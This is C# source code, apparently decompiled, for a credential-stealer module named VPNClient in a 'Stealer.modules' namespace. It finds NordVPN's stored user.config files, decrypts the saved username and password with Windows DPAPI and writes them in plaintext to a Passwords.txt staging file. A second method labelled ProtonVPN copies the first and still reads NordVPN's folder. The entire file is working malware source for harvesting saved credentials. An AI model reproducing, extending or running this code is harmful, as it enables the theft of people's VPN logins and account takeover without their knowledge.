using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Stealer.modules
{
	// Token: 0x0200002F RID: 47
	internal class VPNClient
	{
		// Token: 0x060000E3 RID: 227 RVA: 0x0000AB30 File Offset: 0x00008D30
		public static void GetVPN()
		{
			VPNClient.NordVPN();
			VPNClient.ProtonVPN();
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x0000AB3C File Offset: 0x00008D3C
		public static void NordVPN()
		{
			string path = Program.path;
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string str = "\\VPN\\NordVPN";
			try
			{
				if (Directory.Exists(folderPath + "\\NordVPN\\"))
				{
					Directory.CreateDirectory(path + str);
					using (StreamWriter streamWriter = new StreamWriter(path + str + "\\Passwords.txt"))
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(folderPath, "NordVPN"));
						if (directoryInfo.Exists)
						{
							DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
							for (int i = 0; i < directories.Length; i++)
							{
								foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
								{
									string text = Path.Combine(directoryInfo2.FullName, "user.config");
									if (File.Exists(text))
									{
										XmlDocument xmlDocument = new XmlDocument();
										xmlDocument.Load(text);
										string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
										string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
										if (innerText != null && !string.IsNullOrEmpty(innerText))
										{
											streamWriter.Write("\n[PASSWORD]\n");
											streamWriter.WriteLine("Username: " + VPNClient.Nord_Vpn_Decoder(innerText));
										}
										if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
										{
											streamWriter.WriteLine("Password: " + VPNClient.Nord_Vpn_Decoder(innerText2));
										}
									}
								}
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000E5 RID: 229 RVA: 0x0000ACF4 File Offset: 0x00008EF4
		public static void ProtonVPN()
		{
			string path = Program.path;
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			try
			{
				if (Directory.Exists(folderPath + "\\ProtonVPN\\"))
				{
					Directory.CreateDirectory(path + "\\VPN\\ProtonVPN\\");
					using (StreamWriter streamWriter = new StreamWriter(path + "\\VPN\\ProtonVPN\\Passwords.txt"))
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(folderPath, "NordVPN"));
						if (directoryInfo.Exists)
						{
							DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
							for (int i = 0; i < directories.Length; i++)
							{
								foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
								{
									string text = Path.Combine(directoryInfo2.FullName, "user.config");
									if (File.Exists(text))
									{
										XmlDocument xmlDocument = new XmlDocument();
										xmlDocument.Load(text);
										string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
										string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
										if (innerText != null && !string.IsNullOrEmpty(innerText))
										{
											streamWriter.Write("\n[PASSWORD]\n");
											streamWriter.WriteLine("Username: " + VPNClient.Nord_Vpn_Decoder(innerText));
										}
										if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
										{
											streamWriter.WriteLine("Password: " + VPNClient.Nord_Vpn_Decoder(innerText2));
										}
									}
								}
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x0000AEA4 File Offset: 0x000090A4
		public static string Nord_Vpn_Decoder(string s)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
			}
			catch
			{
				result = "";
			}
			return result;
		}
	}
}
